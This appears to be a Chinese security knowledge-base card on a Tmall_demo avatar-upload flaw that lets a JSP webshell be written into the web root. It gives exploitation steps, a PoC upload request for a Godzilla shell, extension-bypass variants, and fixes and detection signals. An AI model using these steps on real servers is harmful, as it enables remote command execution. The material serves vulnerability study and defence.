---
id: web-generic-file-upload-tmall-avatar-uuid-extension-jsp-getshell
title: Tmall_demo 前台头像上传 UUID 重命名保留客户端后缀：JSP 哥斯拉马写入 Web 目录并解析
type: scenario
domain: web
path: web/generic/file-upload
technique: avatar-upload-uuid-preserve-jsp-extension
tags:
- java
- spring
- file-upload
- uuid
- extension-bypass
- jsp
- webshell
- godzilla
- tmall
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V240
  verified_at: '2026-11-07T10:34:15+08:00'
  notes: 对照原文 img/07-13：前端 uploadImage 仅校验 /^image/ 与 3192000 字节；服务端 uploadUserHeadImage 用 UUID+originalFilename 最后一段后缀落盘 getRealPath("/")+res/images/item/userProfilePicture/，无后缀/内容校验；img/09 filename=2.jsp 返回 uuid.jsp，img/13 哥斯拉 JavaDynamicPayload/JAVA_AES_BASE64 连接 whoami 成功。与 spring-uuid-preserve-original-extension（不同应用/端点/目录，既有卡未演示 JSP 解析）差异成立。原文无版本信息。
url: /docs/web/generic/file-upload/web-generic-file-upload-tmall-avatar-uuid-extension-jsp-getshell/
draft: false
kb_aliases:
- Tmall_demo 文件上传
- uploadUserHeadImage
- 头像上传 getshell
- UUID 保留原后缀
- 哥斯拉 JSP 马
- 天猫商城上传漏洞
---

## 一句话结论

Tmall_demo 的前台头像上传接口 `/user/uploadUserHeadImage` 用 `UUID.randomUUID() + originalFileName.substring(originalFileName.lastIndexOf('.'))` 生成落盘文件名，既不校验扩展名也不校验文件内容；前端 `uploadImage()` 只检查 `file.type` 是否匹配 `/^image/` 和大小，抓包把 `filename` 改回 `.jsp` 即可把哥斯拉 JSP 马写入 `res/images/item/userProfilePicture/`，该目录位于 Web 根且原文环境启用了 `tomcat-embed-jasper`/JSTL，访问 `<uuid>.jsp` 后哥斯拉成功连接并执行命令。

## 原理

- 前端校验只存在于浏览器：个人资料页头像 `<input type="file" onchange="uploadImage(this)">`，`uploadImage` 中先取 `fileDom.files[0]`，用 `var imageType = /^image/; if (file === undefined || !imageType.test(file.type))` 拒绝非图片 MIME，再用 `if (file.size > 3192000)` 拒绝超过约 3MB 的文件，随后 `FormData.append("file", file)` 提交到 `/tmall/user/update` 页面中的上传逻辑。MIME 与大小都在客户端，抓包即可改。
- 服务端 `UserController.uploadUserHeadImage`（`@RequestMapping(value="user/uploadUserHeadImage", method=RequestMethod.POST, produces="application/json;charset=utf-8")`）只做“改名 + 落盘”：

  ```java
  String originalFileName = file.getOriginalFilename();
  String extension = originalFileName.substring(originalFileName.lastIndexOf('.'));
  String fileName = UUID.randomUUID() + extension;
  String filePath = session.getServletContext().getRealPath("/")
          + "res/images/item/userProfilePicture/" + fileName;
  file.transferTo(new File(filePath));
  jsonObject.put("success", true);
  jsonObject.put("fileName", fileName);
  ```

  代码里没有后缀白名单、没有 Content-Type 校验、没有魔数/图片二次渲染、没有对 `originalFileName` 做 basename 过滤；`extension` 完全来自 multipart 的 `filename`，传 `2.jsp` 就得到 `<uuid>.jsp`。
- 落盘目录 `res/images/item/userProfilePicture/` 在 Web 根下；用户资料页的 `<img src="/tmall/res/images/item/userProfilePicture/<uuid>.png">` 证明该目录可被静态访问，把后缀换成 `.jsp` 即可直接请求。
- 原文 `pom.xml` 引入 `org.apache.tomcat.embed:tomcat-embed-jasper`（provided）与 `javax.servlet:jstl`、`taglibs-standard-impl`，JSP 具备编译条件；原文用哥斯拉生成 JSP 马（`JavaDynamicPayload` + `JAVA_AES_BASE64`）上传后连接成功，命令执行回显 `whoami` 为 `desktop-pg5bbfaf\clockwise`，当前目录为项目根目录。
- 本质上 UUID 只让文件名不可预测，没有改变文件类型；随机名不等于类型校验，响应 JSON 又会把可访问的 `<uuid>.jsp` 文件名直接返回，攻击者无需目录枚举。

## 触发条件

- 目标为 Tmall_demo，上传接口 `/user/uploadUserHeadImage` 可达；原文请求带已登录前台用户的 JSESSIONID（Referer 为 `/tmall/userDetails`），代码本身未做登录/权限判断，实际可达性取决于部署时的前台拦截器配置。
- 上传目录位于 Web 根（`getServletContext().getRealPath("/")` 下的 `res/images/item/userProfilePicture/`）。
- 容器/运行方式会解析 JSP：原文为 IDEA 启动的内嵌 Tomcat + `tomcat-embed-jasper`；若打包为 Spring Boot 可执行 jar，内嵌容器默认不解析 JSP，此链不成立。
- 前端只校验 MIME 与大小，攻击者可拦截并改 `filename` 与 `Content-Type`。

## 利用步骤

1. 登录前台，进入“个人资料”，点击头像上传，选择哥斯拉生成的 JSP 马；先把文件名改成 `.png` 以通过前端 `/^image/` 的 MIME 检查（或直接构造请求）。
2. 抓包，把 multipart 中的 `filename` 改为 `2.jsp`，`Content-Type` 保持 `image/png`，其余内容为 JSP 马字节。
3. 发送 `POST /tmall/user/uploadUserHeadImage`，从 200 响应 JSON 读取 `fileName`（形如 `<uuid>.jsp`）与 `success:true`。
4. 访问 `http://<host>:8080/tmall/res/images/item/userProfilePicture/<uuid>.jsp`，确认 JSP 被解析。
5. 用哥斯拉连接该 URL（原文使用 JavaDynamicPayload、JAVA_AES_BASE64），执行 `whoami`/目录命令验证命令执行。
6. 若 `.jsp` 被拦截，可尝试 `.jspx`、`.jsp;.png`、大小写等容器解析变体；若目录不可直接访问，可从响应 `fileName` 或用户资料页 `img src` 取得路径。

## PoC

```http
POST /tmall/user/uploadUserHeadImage HTTP/1.1
Host: localhost:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarya0b2GmPdKFfe3lHT
Cookie: JSESSIONID=<前台登录会话>
Referer: http://localhost:8080/tmall/userDetails

------WebKitFormBoundarya0b2GmPdKFfe3lHT
Content-Disposition: form-data; name="file"; filename="2.jsp"
Content-Type: image/png

<哥斯拉 JSP 马字节>
------WebKitFormBoundarya0b2GmPdKFfe3lHT--
```

```text
# 原文响应：
# {"fileName":"3f8ef7e1-4623-4c62-a1f3-1202de91f458.jsp","success":true}
# 访问：http://localhost:8080/tmall/res/images/item/userProfilePicture/3f8ef7e1-4623-4c62-a1f3-1202de91f458.jsp
# 哥斯拉连接成功，命令执行回显 whoami = desktop-pg5bbfaf\clockwise
```

前端校验代码（为说明绕过点）：

```javascript
function uploadImage(fileDom) {
    var file = fileDom.files[0];
    var imageType = /^image/;
    if (file === undefined || !imageType.test(file.type)) { alert("请选择图片！"); return; }
    if (file.size > 3192000) { alert("图片大小不能超过3M！"); return; }
    var formData = new FormData();
    formData.append("file", file);
    // ...
}
```

## 变体与关联

- 后缀变体：`substring(lastIndexOf('.'))` 取最后一个点之后的内容，`shell.jsp` → `.jsp`；`shell.jsp.png` 取到 `.png` 不可执行；`shell.jsp;.png`、`shell.JSP`、`.jspx` 视容器解析规则而定。
- 目录变体：同一 Controller 若还有其它 `transferTo` 上传点，落盘目录与返回字段可能不同，但仍以 `getRealPath` 拼接时同样位于 Web 根。
- 关联：[[web-generic-file-upload-spring-uuid-preserve-original-extension]]（同为 UUID + 客户端原后缀的 Spring MVC 上传，但该卡是另一管理系统的 `uploadFileApp/actionAdd/actionCloudAddFile`，落盘 `/usr/web/...`，原文仅确认任意文件写、未演示 JSP 解析；本例端点、目录、运行环境不同，且完整打通到哥斯拉命令执行）。
- 关联：[[web-generic-file-upload-newbeemall-admin-upload-jsp]]、[[web-generic-file-upload-wisdom-education-upload-whitelist-jsp]]（同为 Java 商城/教育系统的 JSP 上传 getshell）。
- 边界：Spring Boot 可执行 jar 默认不支持 JSP；上传目录若被 Nginx 单独拦截脚本解析、或接口加了登录与后缀白名单，利用失败。

## 检测与防御

- 修复：服务端对扩展名做白名单（只允许 jpg/png/gif/webp），并用服务端生成的扩展名替换客户端后缀；不要拼接 `getOriginalFilename()` 的任何部分。
- 修复：校验 MIME、文件头/魔数，对图片做二次渲染；拒绝 `.jsp`/`.jspx`/`.php` 等脚本后缀及其大小写、分号、双后缀变体。
- 修复：上传目录移出 Web 根；必须公开时禁止脚本解析（Tomcat 映射、Nginx `location`、Apache `php_flag engine off`）。
- 加固：上传接口加登录与权限校验，返回的文件名不要暴露可执行路径；对 `getRealPath` 拼接的上传路径做统一封装。
- 检测：上传请求 `filename` 含 `.jsp` 等脚本后缀但 `Content-Type` 为图片；Web 目录出现 UUID 命名的脚本文件；访问该文件返回 200 且响应含脚本输出/命令结果；哥斯拉特征流量（AES payload、固定 User-Agent 等）。
